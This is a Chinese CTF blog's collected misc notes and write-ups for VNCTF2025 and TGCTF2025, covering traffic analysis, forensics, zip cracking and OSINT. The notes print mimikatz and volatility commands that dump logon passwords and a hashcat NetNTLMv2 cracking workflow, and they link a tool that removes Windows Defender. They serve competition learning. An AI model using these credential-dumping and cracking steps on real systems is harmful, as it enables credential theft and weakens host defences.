bkcrack -k 119be489 086fed79 8cbf1ed7 -r 11 \?b# -k后面跟的是三段密钥# 11 是已知的密码的长度# \?b表示尝试所有可打印字符，\?l是所有小写字母，\?u是所有大写字母，\?d是所有数字,\?s是所有特殊字符，\?a是字母加数字（等同?l?u?d），\?p是ascii字符（等同?l?u?d?s）

不知道长度也可以爆破
bkcrack -k 119be489 086fed79 8cbf1ed7 -b \?b









流量分析题思路：先导出一下http，tcp，ftp看一下有没有什么东西，没有再过滤，一个个查看tcp流
如果有东西可以保存下来。
有的是键盘流量和鼠标流量，注意辨别。
如果没思路的话可以试试foremost或者binwalk一下
更多流量分析可以看这个 Network Traffic Analysis | MetaVi
常用命令过滤post
http.request.method==POST

过滤get
http.request.method==GET

统计ip：
利用wireshark的统计-IPv4 Statistics-ALL Address功能可以查看IP的数量大小
TLS加密一般来说这种加密是你看不到http等流量，需要文件等把他们解密出来才能看到
解密方法：
私钥文件编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;edit-&gt;+号-&gt;Key File-&gt;输入ssc.key-&gt;OK或者日志文件编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;加载日志文件((Pre)-Master-Secret log)

就能看到了
log文件一般格式
第一种（rsa私钥）：
-----BEGIN RSA PRIVATE KEY-----123-----END RSA PRIVATE KEY-----

第二种：
CLIENT_HANDSHAKE_TRAFFIC_SECRET &lt;ClientHello随机数&gt; &lt;密钥&gt;SERVER_HANDSHAKE_TRAFFIC_SECRET &lt;ClientHello随机数&gt; &lt;密钥&gt;CLIENT_TRAFFIC_SECRET_0 &lt;ClientHello随机数&gt; &lt;密钥&gt;SERVER_TRAFFIC_SECRET_0 &lt;ClientHello随机数&gt; &lt;密钥&gt;EXPORTER_SECRET &lt;ClientHello随机数&gt; &lt;密钥&gt;

（第二种的log文件编辑时记得不用加&lt;&gt;）
SQL注入——布尔盲注它是用ascii码的大小比较来判断库名、表名、字段名和字段值的内容的
用二分法来爆破得出库里内容的
可以试着先过滤一下http流量，再&#x2F;文件&#x2F;导出分组解析结果&#x2F;AS CSV，把流量导出成表格。看得更清楚。
一般来说，前面的内容是hacker来判断数据库名、表名、字段名的，我们可以直接拉到最下面来看。
因为用的是二分法，所以在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符。
我们需要找到被重复判断的flag的ascii转化。
NTML流量分析（SMB流量）我们需要的是这些东西
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response

有两种方式
1.tshark
tshark可以获得username::domain:ServerChallenge:NTproofstring:，但是没有modifiedntlmv2response
命令（tshark是kali自带的）
tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid

接下来还是要回到流量里找modifiedntlmv2response，这里顺便讲了第二种方法
2.流量里找
过滤这个
ntlmssp

找到NTLMSSP_AUTH 包 打开流量包中的 Security Blob层 复制用户名、域名
然后过滤
ntlmssp.ntlmserverchallenge

查找NTLM Server Challenge字段，通常这个数据包是在NTLM_Auth数据包之前，将该值作为十六进制字符串复制到文本文档
最后需要的modifiedntlmv2response仍然在NTLM_Auth里
需要我们在里面找到NTLMv2 Response
除了NTProofStr以外的就是我们要找的modifiedntlmv2response了（注意这里复制hex值）
&#x3D;&#x3D;&gt;得到的所有东西需要以
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
形式保存到txt文本里，然后使用hashcat爆破
.\hashcat -m 5600 hash.txt rockyou.txt# 5600 表示NetNTLMv2模式# rockyou是github上找的字典，还挺大

就能拿到密码了。
NTML密码拿到后可以在wireshark首选项里面有一个NTMLSSP里输入这个密码，然后得到解密过的流量。
USB流量usb流量还是蛮好辨别的：键盘流量是8字节的，鼠标是4字节。
可以先用tshark提取
#这个格式为 usbhid tshark -r keyboard.pcapng -T fields -e usbhid.data &gt; usbdata.txt#keyboard.pcapng是被提取的流量

或者
#这个格式是 usb.capdata.#提取数据的命令，这里用正则表达式剔除了空行tshark -r usb.pcapng -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt# -r 指定了需要读取的文件# -T 表示仅仅输出所选字段# -e 指定提取的字段# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）



键盘流量键盘流量有标准——hid键盘标准： https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf
如果看的烦的话也可以去网上搜相关的标准
&#x2F;
或者我们可以去下一个 UsbKeyboardDataHacker——恢复击键信息
地址 GitHub - WangYihang&#x2F;UsbKeyboardDataHacker: USB键盘流量包取证工具 , 用于恢复用户的击键信息
为此我还安装了虚拟环境
先激活环境
source UsbKeyboardDataHacker/bin/activate

再切
cd UsbKeyboardDataHacker

分析（注意要在同目录下）
python3 UsbKeyboardDataHacker.py --input key.pcap



TTL加密看到的txt类似于这种：


实际上这是TTL加密

[!NOTE]
TTL加密：简单来说就是，图中63，127，191，255转化为二进制的值分别为 00111111，01111111，10111111，11111111。
发现只有前两位不同，TTL加密就是利用前两位进行加密，将每个前两位重新进行合并，8位为一组。
所以TTL加密的解密方法：
1，将所有前两位合并为8位，并且每八位一组。
2，将上面的每组转化为十六进制的字符

解密脚本：
import binascii f = open(&#x27;1.txt&#x27;, &quot;r&quot;)  #输入的txtstr = &#x27;&#x27;Binary = &#x27;&#x27;number = &#x27;&#x27;while 1:    num = f.readline()    if not num:        break    if num.rstrip() == &#x27;63&#x27;:  # 去掉每行后面的空格        Binary = &#x27;00&#x27;    elif num.rstrip() == &#x27;127&#x27;:        Binary = &#x27;01&#x27;    elif num.rstrip() == &#x27;191&#x27;:        Binary = &#x27;10&#x27;    elif num.rstrip() == &#x27;255&#x27;:        Binary = &#x27;11&#x27;    str += Binaryfor i in range(0, len(str), 8):    number += chr(int(str[i:i + 8], 2))data = binascii.unhexlify(number) f2=open(&#x27;111.txt&#x27;,&#x27;wb&#x27;)    #保存到111.txtf2.write(data)f2.close()

这个脚本要跑好一会，最后保存至111.txt。
voip流量这种实际上就是电话的流量
可以在wireshark中点击电话-voip通话来查看
内存取证&#x2F;磁盘取证思路：这种需要虚拟机来挂载文件，可以使用vmware或者FTK，我做的不多。。
或者用vera挂载的。
veracrypt这个需要一个文件，可以挂载磁盘
而且可能会需要密钥和密钥文件，例子：


注意：不同密码可以解密出不同的磁盘文件
vol2 || vol3可以使用vol2或3来分析
查看imageinfo——查看操作版本
vol.py -f image.raw imageinfo

lsadump——看用户密码
vol.py -f image.raw --profile=Win7SP1x86_23418 lsadump  #profile后面跟的是imageinfo得到的操作版本#lsadump需要安装插件

vol2的一些基本命令
# 识别操作系统的基本信息vol.py mem.dump imageinfo# 查看进程vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist# 查看隐藏或者解链的进程vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree# 通过memdump爆破出进程对应的信息，3036是对应进程vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3036 --dump-dir=./  

注意，mspaint.exe是画图进程，可能会藏东西，如果有的话可以dump下来，改后缀为.data，使用GIMP2打开图片。不断修改x，y的值直到看到藏的东西。（GIMP2可以在microsoft store里下到）
.vmdk文件后缀为 .vmdk 的文件是 VMware 虚拟磁盘文件，通常用于虚拟机环境中存储虚拟机的磁盘数据。
vmdk可以用7z解压！
可以使用虚拟机打开试试。
有些可以看010，有内容的话，可以尝试解密，有时候直接复制解密不了
可以使用kali自带的7z解密提取这些文件
7z x flag.vmdk -o./

解压后就能看到好几个文件夹。
vhd文件这是磁盘文件，可以直接双击打开，会发现多了两个磁盘，在磁盘里可以找东西
怎么虚拟化来看图形化界面？
使用Hyper-V搭建虚拟机（怎么下Hyper-V？可以看这个
注意挂载vhd的时候要选择第一代来挂载，不然会报错
进入后可以win+r看上一条命令找线索。
理论上也可以更改vhd格式来使用vmware挂载。
如果vhd用了BitLocker加密的话我们可以使用Elcomsoft Forensic Disk Decryptor进行解密
iso映像文件一般是u盘文件，可以直接改后缀为zip然后解压，或者formost提取出里面的内容
img文件可以kali挂载
mount 1.img /mnt# 挂载到mnt下cd /mnt# 切进去就行extundelete attachment.img --restore-all # 恢复被删除的目录或文件sudo umount /mnt# 先回到上级目录再取消挂载

也可以试试其他工具
安卓取证安卓取证一般是给vmdk文件或者ovf文件，都可以用vmware挂载，后者可以直接在vm打开文件
DiskGenius用于恢复磁盘删除的文件，也可以直接全部扫描然后提出来。
pyjail &#x2F; py沙盒逃逸思路：要看他给没给源代码，没有怎么猜测，给了怎么绕过黑名单&#x2F;长度限制等等
参考链接： 
Python沙盒逃逸深度学习 | C3ngH’s B10g
Python Jail 沙盒逃逸 合集_pyjail-CSDN博客
ms-office题思路：可以改后缀为zip看看，文本里可能会把文字改成白色的来隐藏可以ctrla+改色看看
遇到的加密过的mc-office可以用passwarekit来爆破
ms-office文件本质是zipMS-Office文件word、excel、ppt本质都是zip文件，就可以隐写。
可以直接改后缀名为zip
宏如果后缀是docm的话可能有宏，在宏里看看
1.WPS自带宏查看，在 视图&#x2F;宏&#x2F;查看宏 里
2.使用olevba
olevba decode.docm

doc里隐藏文字勾选文件/选项/显示/隐藏文字
然后看看有无隐藏的东西
视频题思路：我遇到的一般是在视频的某一帧里藏二维码之类的内容，需要好点的眼力
帧慢放使用potplayer即可
osint思路：exiftool识别图片gps
谷歌识图，谷歌地图等等
识图谷歌识图：https://images.google.com/?hl=zh-cn
yandx识图：https://yandex.com/images/
exiftool查看gps
地图&#x2F;定位试试谷歌地图看街景，但谷歌的街景是很久以前的，所以有可能出不来
谷歌地图：https://www.google.com/maps/?hl=zh-cn
百度地图：https://map.baidu.com/@13322349,3375628,13z
LTE定位基站地址
定位网址： 移动联通电信基站位置查询
3词描述地址
网站：what3words &#x2F;&#x2F;&#x2F; The simplest way to talk about location
其他 &amp;&amp; 工具反编译——这应该是reverse领域才对。。pyc反编译
.pyc 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行
想查看 .pyc 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 .py 文件。

-使用 uncompyle6
-在线网站 https://tool.lu/pyc/
pyc也有剑龙隐写，地址： AngelKitty&#x2F;stegosaurus: A steganography tool for embedding payloads within Python bytecode.
如果有1.pyc，直接（注意这里python的版本要是3.6的，也许是要对应pyc文件的代码的python版本，我们可以使用pyenv切换python版本）
python stegosaurus.py -x 1.pyc





exe反编译使用IDA
apk反编译使用jadx-gui-1.4.4-no-jre-win.exe
eml文件拿到一个邮件文件后缀是eml的可以利用QQ邮箱，
选择写信，收信人写自己，把eml文件拖进去，然后发送。
之后自己就能收到这个文件，QQ邮箱可以预览eml文件，如果有附件的话直接下载就好了。
.dmp文件
dmp文件是windows系统中的错误转储文件，当Windows发生错误蓝屏的时候，系统将当前内存【含虚拟内存】中的数据直接写到文件中去，方便定位故障原因。
里面包含主机用户密码信息

.dmp文件binwalk和foremost提不出来，需要我们手动提一下
提出来之后用mimikatz分析文件，下载地址 发行版 2.2.0 20220919 Djoin parser &amp; Citrix SSO Extractor · gentilkiwi&#x2F;mimikatz · GitHub
这个是已经打包好的exe，直接运行就行
相关命令
//提升权限privilege::debug//载入dmp文件sekurlsa::minidump lsass.dmp//读取登陆密码sekurlsa::logonpasswords full









画图1.gnuplot得到诸如（7，7）的文本我们需要转化成 7 7 ，如


转化成 ↓ ↓ ↓


可以直接使用记事本的替换功能，比脚本好用的多
脚本（不推荐）：
with open(&#x27;E:\meihuai.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)    re = res.read()    res.close()    with open(&#x27;E:\output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入output.txt    re = re.split()    tem = &#x27;&#x27;    for i in range(0, len(re)):        tem = re[i]        tem = tem.lstrip(&#x27;(&#x27;)        tem = tem.rstrip(&#x27;)&#x27;)        for j in range(0, len(tem)):            if tem[j] == &#x27;,&#x27;:                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]        gnup.write(tem + &#x27;\n&#x27;)    gnup.close()

然后
gnuplot

再
plot &#x27;zuobiao.txt&#x27;  

来进行画图，画好后会自己打开
2.RGB数据串转图片可以用随波逐流
不行就脚本
from PIL  import Imagestring=&#x27;&#x27;file=open(&#x27;qr.txt&#x27;)MAX=200picture=Image.new(&quot;RGB&quot;,(MAX,MAX))for y in range(MAX):    for x in range(MAX):        string =file.readline()        picture.putpixel([x,y],eval(string)) #直接使用eval()可以转为元组picture.show()



3.Logo画图这种的代码很有特征，类似于这种：
cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home

那就是画图没跑了
在线网站： Logo解释器
4.base64转图片随波逐流
路由器配置查看工具RouterPassView-下载 https://routerpassview.en.lo4d.com/windows
使用方法：
用于恢复路由器密码的工具，能够从路由器中提取用户，密码，无线密钥等信息
RouterPassView,大多数现代路由器允许您备份到一个文件路由器的配置，然后从文件中恢复配置时的需要。路由器的备份文件通常包含了像您的ISP的用户名重要数据&#x2F;密码，路由器的登录密码，无线网络的关键。如果你失去了这些密码1 &#x2F;钥匙，但你仍然有你的路由器配置的备份文件，RouterPassView可以帮助你从你的路由器恢复您丢失密码的文件。
010editor .zip模板对照表+ ZIPFILERECORD record # 压缩源文件数据区    - char frSignature[4] # 压缩源文件标志    - ushort frVersion # 压缩源文件版本    - ushort frFlags # 压缩源文件标志 （有无加密，这个更改这里进行伪加密，改为01 00打开就会提示有密码了）    - enum COMPTYPE frCompression    - DOSTIME frFileTime # 压缩源文件时间    - DOSDATE frFileDate # 压缩源文件日期    - uint frCrc # 压缩源文件CRC32校验值    - uint frCompressedSize # 压缩源文件压缩后大小    - uint frUncompressedSize # 压缩源文件压缩前大小    - ushort frFileNameLength # 压缩源文件名长度    - ushort frExtraFieldLength # 压缩源文件扩展域长度    - char frFileName[frFileNameLength] # 压缩源文件名    - uchar frData[frCompressedSize] # 压缩源文件数据+ ZIPDIRENTRY dirEntry # 压缩源文件目录区    - char deSignature[4] # 目录标志    - ushort deVersionMadeBy # 创建该条目的版本    - ushort deVersionNeeded # 解压该条目所需的版本    - ushort deFlags # 标志位 (同样判断是不是伪加密的位置，奇数时候是有加密的)    - enum COMPTYPE deCompression # 压缩方法    - DOSTIME deFileTime # 最后修改时间    - DOSDATE deFileDate # 最后修改日期    - uint deCrc # CRC32校验值    - uint deCompressedSize # 压缩后的大小    - uint deUncompressedSize # 压缩前的大小    - ushort deFileNameLength # 文件名长度    - ushort deExtraFieldLength # 扩展域长度    - ushort deFileCommentLength # 文件评论长度    - ushort deDiskNumberStart # 起始磁盘编号    - ushort deInternalAttributes # 内部属性    - uint deExternalAttributes # 外部属性    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置    - char deFileName[deFileNameLength] # 文件名    - char deExtraField[deExtraFieldLength] # 扩展域    - char deFileComment[deFileCommentLength] # 文件评论+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志    - char elSignature[4] # 结束标志    - ushort elDiskNumber # 当前磁盘编号    - ushort elStartDiskNumber # 目录开始的磁盘编号    - ushort elEntriesOnDisk # 当前磁盘上的条目数量    - ushort elEntriesTotal # 总条目数量    - uint elSizeOfDirectory # 目录的总大小    - uint elOffsetOfDirectory # 目录开始的偏移位置    - ushort elCommentLength # 注释长度    - char elComment[elCommentLength] # 注释



一些kali的小知识基本命令ls  #列出所有东西cd  #切换pwd #列出路径cat  #查看tac #cat的反向，逆向(行)读取mkdir #创建目录mv #移动文件/重命名文件cp #复制文件/目录nl #加行号more #按页读取内容ps #查看进程信息less #查看文件内容，与more相似head #仅打印文件开头内容tail #仅打印文件结尾内容ping #远程连接，如主机jobs #查看后台运行任务kill #杀死后台运行任务，需要加-pidwhich #查找文件所在位置whereis #查找文件路径locate #查找文件路径，与whereis相似find #向下遍历寻找文件--help #任何命令后加这个即可看到说明sudo su  #提升权限至管理员rm -rf profire_name  #删除文件目录ifconfig  #查看ip地址

想利用命令将mnt&#x2F;e&#x2F;下的东西移动到wsl里可以用这个：
cp /mnt/e/1.png /home/metavi/目录名字



切换python版本kali自带python2.7和python3.x，有时候需要我们切换
update-alternatives --config python

然后选序号就行
图形化桌面-远程连接这个要自己下
kex



虚拟环境Kali Linux 对 Python 包管理进行了限制，防止系统范围内的 Python 安装被破坏。所以有时候报错是需要使用虚拟环境
创建一个新的虚拟环境：
python3 -m venv env  #env是虚拟环境名称，可以更改

激活虚拟环境：
source env/bin/activate

在虚拟环境中就可以安装一些东西了
退出虚拟环境：
deactivate

删除虚拟环境只需要删除对应虚拟环境的目录即可
一些windows的小知识基本命令ls  #列出所有东西cd  #切换cat  #查看ipconfig  #查看ip地址



alt按住alt再按小键盘的数字的话可以输出对应的ascii码值，比如我按住alt再按65的话会输出A
删除windows自带防火墙——windows defendergithub地址： https://github.com/ionuttbara/windows-defender-remover
管理包体&#x2F;python版本pip安装的包体可以用conda来管理，python版本用pyenv管理
conda命令：
conda --version  #查看conda版本conda create -n env_name python=3.8  #创建虚拟环境（python版本为3.8、名字为env_name）conda env list  #查看有哪些虚拟环境conda activate env_name  #激活虚拟环境conda deactivate  #退出虚拟环境conda remove --name env_name --all  #删除虚拟环境（将该指定虚拟环境及其中所安装的包都删除）conda remove --name env_name  package_name  #只删除虚拟环境中的某个或者某些包conda list  #查询看当前环境中安装了哪些包conda install package_name  #当前（虚拟）环境中安装一个包conda uninstall package_name  #conda卸载包conda install python=3.5  #下载并变更python版本

pyenv命令：
pyenv install --list  #查看所有可用py版本pyenv install 3.8.12  #下载py版本pyenv global 3.9.7  #全局切换py版本pyenv local 3.8.12  #局部切换py版本（仅当前目录）pyenv version  #查看当前版本pyenv versions  #查看所有安装的py版本pyenv uninstall 3.8.12  #卸载





Linux提权详细见我这篇博客 Linux提权浅析 | MetaVi
区块链Blockchain详见我这篇博客 区块链Blockchain学习 | MetaVi
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse Record</title>
    <url>/2024/11/Reverse-Record/</url>
    <content><![CDATA[反编译pyc反编译
.pyc 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行
想查看 .pyc 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 .py 文件。

-使用 uncompyle6
-在线网站 https://tool.lu/pyc/
exe反编译使用IDA
apk反编译使用jadx-gui-1.4.4-no-jre-win.exe
NewStar-re复现学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi
1.ez_debug当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。

这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较注意上面的you函数，步入后看到几个变量，下断点，调试

能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag
总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025misc复现</title>
    <url>/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[这个比赛的misc真是难，除了一道签到之外几乎全是区块链和ai，唯一一道的取证还是安卓取证，而且还模拟的真实取证过程。。
全部的wp可以在vnctf2025的群里有，或者官方公众号。
打的我道心破碎了要。。。
VN_Lang简单的misc签到题
打开exe发现是flag但是是vn自创文字
使用IDA打开exe，直接爆搜VNCTF就能发现flag了


flag：VNCTF{wXD4cznGnWqVVPRTF1Mzlf7zrPTfBRkKIq2Kgyq4Gohs2}
这个题好像每个人flag不一样
Echo Flowers这个真是毁我道心了，看了一天。。
拿到echo flowers文件看到里面有一个echo_flowers.ovf文件，可以使用vmware挂载
虽然这道题挂载不甚有大用就是了
挂载后看到桌面上只有一个imToken：


所有应用也只有一点点，在便签，imtoken，设置里面都没有发现什么东西，这就是这道题的神奇之处了
题目要求恢复密码，我们可以通过找到12个助记词来恢复密码，但是系统中又没有什么提示该怎么办呢？


在输入法打单词的时候发现有上次遗留的输入。

[!NOTE]
手动执行 一遍导入助记词流程可以发现，手机安装的某数字钱包App在导入助记词时没有将助 记词输入框设为密码属性，使得输入法可以开启单词联想，而手机安装的某输入法 （包括厂商预装版本）的单词联想是默认开启的。（题目描述中也对此给出了提示： 114 英语不好）  多次导入助记词会发现输入助记词首字母即可联想助记词单词。 

所以我们可以大致确定助记词的范围，再根据所有2048个助记词确定是那些助记词
所有2048个助记词： bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips
大致确定的助记词：
ramp twenty only space define fashion high carpet muscle laundry couch ranch

接下来要做的就是恢复这12个助记词的顺序了，已知暴力破解这12个助记词顺序是不现实的（因为要好几天），所以我们需要在文件中寻找那个储存了顺序的“词典”文件。
大概有两种方法：方法一：7z解压vmdk文件
直接7z解压，能直接把所有vmdk的文件解压出来
（之前怎么能忘了！）
方法二：DiskGenius挂载
网上下一个DiskGenius，可以直接挂载vmdk
主要DiskGenius可以恢复磁盘上删除的文件这是它的厉害之处
恢复后如图：
。
。
总之就是把vmdk里所有文件全部都解压出来，然后在里面找可疑的文件。
最后找到了android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict 这个文件夹下，具体来说就是sgim_gd_usr.bin这个文件
然后这里有一个比较偏的知识点，就是

[!NOTE]
搜狗输入法用户词库文件不是utf-8编码而是utf-16

所以一般的记事本和010是很难看出来什么东西的
这里有两种方法来看到内容
方法一：使用string命令
kali自带string命令
strings命令：用于从二进制文件中提取可打印字符串。它可以提取和显示文件中的所有可打印字符串，常用于分析二进制文件、调试和逆向工程
先cd
cd android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict

然后string
strings --encoding=b * 

然后就能看到所有助记词了




方法二：notepad++使用utf16查看文件
找到android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict/sgim_gd_usr.bin这个文件，用notepad++，utf16查看也能看到所有助记词，需要眼力（当然也可以使用别的能看utf16的工具）


。
最后恢复顺序
ranch only space define laundry carpet muscle ramp high twenty couch fashion

所有助记词和顺序都得到了，直接用手机imToken设置一个密码然后利用高级设置查看私钥，导出私钥


或者使用在线网站（我用不明白）网站： BIP39 - Mnemonic Code
注意默认路径 m&#x2F;44’&#x2F;60’&#x2F;0’&#x2F;0&#x2F;0(是imToken默认路径)，所以有些网站是不行的。
flag：VNCTF{6433c196bb66b0d8ce3aa072d794822fd87edfbc3a30e2f2335a3fb437eb3cda} 
ezSignal拿到一个压缩包，解压时报错了，可以看到实则有两个文件但只解压出一个文件
我们使用7z解压出两个文件，原来另一个文件名是空白的所以解压不出来，但是7z可以
一张图片和一个无后缀名的文件，问了一下ai才知道是grc文件。
改名1.grc，使用gnuradio打开，直接
gnuradio-companion 1.grc

看到：


那张png图片里面藏了一些东西，使用binwalk解压出flag1.txt和flag2.txt
此时我们需要逆向这个grc文件，因为我们看到这个文件是把wav文件解析成两个txt文件，我们需要逆向得到这个wav文件。
利用旁边的core制作逆向exp，（制作的时候要注意打如48k的时候要打48000而不能是48k，不然会报错）如下：
此时就生成了1111.wav，一听就知道是sstv文件
利用虚拟声卡+RX-SSTV（不知道为什么我虚拟声卡有问题没跑出来，最后扬声器跑出来的）
注意不能用github上那个sstv，否则会报错如下：
ValueError: SSTV mode is unsupported (VIS: 125)

最终跑出来的二维码：


使用手机上BinaryEye扫一下就行


flag：VNCTF{W0w_Y0u_Ar3_G0od_4t_R4di0_S1gn4L}
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF2025misc全解</title>
    <url>/2025/04/TGCTF2025misc%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[这次比赛还是挺好玩的，尤其是 misc方向，ez_zip是挺好一题目，图片秘密也不错，如果一开始的附件就是好的就会更好了。
其他方向的解可以看我们A1natas的公众号。
关注A1natas喵，关注A1natas谢谢喵！
简单签到，关注：”杭师大网安“谢谢喵🐱关注公众号得flag。
ez_zip爆破得到密码是20250412。
解压后得到一个压缩包和一个sh512.txt，把txt中的那句话sha512一下，deflate明文攻击。
不知道为什么我的bk检测不出来这个文件，于是我用了arc 


然后又得到一个压缩包，是损坏的，要根据数据存储区修复了一下压缩包
可以用Bandizip无密码快速压缩一个例子，然后对照着把压缩包修复一下就行
dirEntry的flag.txt应该是少东西了，需要我们手动补上




修复完成后打开即可得到flag：TGCTF{Warrior_You_have_defeated_the_giant_dragon!}




TeamGipsy&amp;ctfer 预期解应该是查找文件，可以用diskgenius：


桌面上有个mimi.txt，发现出题人用Docker起了一个MySQL，直接去&#x2F;var&#x2F;lib&#x2F;docker目录下翻
发现在/var/lib/docker/overlay2/6ac971c2de3baa602bb4335d6899bbf1963140364ce248decc9557b2f49139f9/diff/root/.mysql_history中就有flag：HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}
 

第二种也可以用取证大师，一样查找文件。
非预期应该是用string命令直接搜出来flag
strings Ubuntu-s00*.vmdk | grep HZNUCTF

（这个要跑一会的）




你能发现图中的秘密吗？这道题挺好的，就是老是有问题
先zsteg跑一下


得到解压密码后解压得到一个pdf，一个图片
第一张pdf的左上角有第二部分的flag：
flag2&#x3D;_attentive_and_conscientious}
这个改之前的，改之后的是用PS的隐藏图层隐藏的


用010打开final_challenge2.png，发现有一块IDAT块不太正常


提取出来，补上PNG文件头尾，然后爆破宽高即可得到另一段flag 


Tips：这里要注意把IDAT的前四个字节也一起复制过来，并且保持不变
因为四字节代表的是数据长度，这里如果出错，图片的数据长度就错了，因此再爆破宽高也没用了
两段flag合起来就是最后的flag：flag{you_are_so_attentive_and_conscientious}



next is the end直接脚本就行
#!/usr/bin/env python3import osimport sysdef traverse(path):    &quot;&quot;&quot;    递归遍历目录：      1. 如果当前目录中存在名为 &#x27;next_or_end&#x27; 的子目录，则进入该目录；      2. 否则：         - 如果目录中只有一个项目且该项目为文件，则返回该文件路径；         - 如果只有一个项目但是目录，则继续进入；         - 如果目录中有多个项目，则报错无法确定正确路径。    &quot;&quot;&quot;    while True:        # 若当前路径不是目录，则到达最终目标（通常是文件）        if not os.path.isdir(path):            return path        items = os.listdir(path)        # 如果当前目录中有 &#x27;next_or_end&#x27; 文件夹，则进入该目录        if &quot;next_or_end&quot; in items:            path = os.path.join(path, &quot;next_or_end&quot;)        else:            # 当前目录没有 &#x27;next_or_end&#x27;            if len(items) == 1:                next_path = os.path.join(path, items[0])                if os.path.isdir(next_path):                    # 如果唯一的项目还是目录，则继续进入                    path = next_path                elif os.path.isfile(next_path):                    # 如果唯一的项目是文件，则返回                    return next_path                else:                    print(f&quot;遇到未知类型：&#123;next_path&#125;&quot;)                    return None            else:                print(f&quot;无法确定路径：目录 &#x27;&#123;path&#125;&#x27; 中存在多个项目：&#123;items&#125;&quot;)                return Noneif __name__ == &#x27;__main__&#x27;:    # 从命令行获取起始目录，若未传参数则默认为当前目录    start_path = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;.&quot;    result = traverse(start_path)    if result:        print(f&quot;最终目标路径：&#123;result&#125;&quot;)        if os.path.isfile(result):            # 如果目标为文件，读取并打印文件内容            try:                with open(result, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:                    content = f.read()                print(&quot;文件内容如下：&quot;)                print(content)            except Exception as e:                print(f&quot;读取文件时出错：&#123;e&#125;&quot;)        else:            print(&quot;最终目标不是一个普通文件。&quot;)    else:        print(&quot;未能找到最终目标。&quot;)

看到flag



where it is(osint)谷歌识图
 

点进去发现
 

站点就是这个：港墘站
你的运气是好是坏？笑死我了flag直接一试就试出来了：114514
这是啥o_o下载得到一个无后缀的文件，文件头发现是gif，改成gif后拖进ps里看，发现最后几帧有散开的汉信码碎片。修复如下：
 

扫码得到：time is your fortune ,efficiency is your life
猜测是帧间隔隐写，用puzzlesolver提出帧间隔放入python转ASCII码，得到flag
